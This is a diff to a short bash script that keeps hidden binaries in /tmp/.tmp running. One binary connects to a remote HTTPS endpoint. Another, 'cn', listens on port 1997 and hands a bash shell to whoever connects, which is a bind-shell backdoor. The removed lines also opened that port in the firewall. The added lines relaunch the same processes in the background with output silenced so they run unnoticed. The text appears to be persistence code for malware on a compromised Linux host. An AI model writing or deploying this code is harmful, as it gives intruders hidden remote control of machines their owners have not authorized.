@@ -1,8 +1,5 @@
 #!/usr/bin/bash
 
-nohup pgrep girmx > /dev/null || /tmp/.tmp/girmx
-nohup pgrep linmer > /dev/null || /tmp/.tmp/linmer -url https://192.168.4.135:443
-
-firewall-cmd --permanent --zone=public --add-port=1997/tcp
-firewall-cmd --reload
-nohup pgrep cn > /dev/null || /tmp/.tmp/cn -l -e /usr/bin/bash -p 1997
+nohup /usr/bin/bash `pgrep girmx > /dev/null || /tmp/.tmp/girmx` > /dev/null 2>&1 &
+nohup /usr/bin/bash `pgrep linmer > /dev/null || /tmp/.tmp/linmer -url https://192.168.4.135:443` > /dev/null 2>&1 &
+nohup /usr/bin/bash `pgrep cn > /dev/null || /tmp/.tmp/cn -l -e /usr/bin/bash -p 1997` > /dev/null 2>&1 &
